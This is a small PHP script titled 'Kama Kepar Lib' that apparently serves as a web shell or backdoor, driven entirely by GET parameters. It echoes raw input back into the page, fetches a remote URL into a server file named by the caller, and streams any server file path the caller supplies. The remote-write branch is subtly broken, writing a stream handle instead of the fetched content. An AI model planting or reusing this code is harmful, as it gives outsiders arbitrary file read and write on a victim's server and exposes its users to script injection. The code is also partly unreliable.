<title>Kama Kepar Lib</title>
<?php
if (isset($_GET["echo"])) {
$echo = $_GET['echo'];
echo $echo;
}
if (isset($_GET["file"])) {
  $ff=$_GET['file'];
  $url = $_GET['url'].$ff;
  $file = fopen ($url, "r");
  echo $file;
  $myfile = fopen($ff, "w");
  fwrite($myfile, $file);
  fclose($myfile);
}
if (isset($_GET["download"])) {
  $source = $_GET['download'];
  //$ch = curl_init();
  //curl_setopt($ch, CURLOPT_URL, $source);
  //curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  //curl_setopt($ch, CURLOPT_SSLVERSION,3);
  //$data = curl_exec ($ch);
  //$error = curl_error($ch); 
  //curl_close ($ch);
  ///echo $data;
  ignore_user_abort(true);
set_time_limit(0); // disable the time limit for this script

$path = $source; // change the path to fit your websites document structure

$dl_file = preg_replace("([^\w\s\d\-_~,;:\[\]\(\).]|[\.]{2,})", '', $_GET['download_file']); // simple file name validation
$dl_file = filter_var($dl_file, FILTER_SANITIZE_URL); // Remove (more) invalid characters
$fullPath = $path.$dl_file;

if ($fd = fopen ($fullPath, "r")) {
    $fsize = filesize($fullPath);
    $path_parts = pathinfo($fullPath);
    $ext = strtolower($path_parts["extension"]);
    switch ($ext) {
        case "pdf":
        header("Content-type: application/pdf");
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); // use 'attachment' to force a file download
        break;
        // add more headers for other content types here
        default;
        header("Content-type: application/octet-stream");
        header("Content-Disposition: filename=\"".$path_parts["basename"]."\"");
        break;
    }
    header("Content-length: $fsize");
    header("Cache-control: private"); //use this to open files directly
    while(!feof($fd)) {
        $buffer = fread($fd, 2048);
        echo $buffer;
    }
}
fclose ($fd);
exit;
}
?>
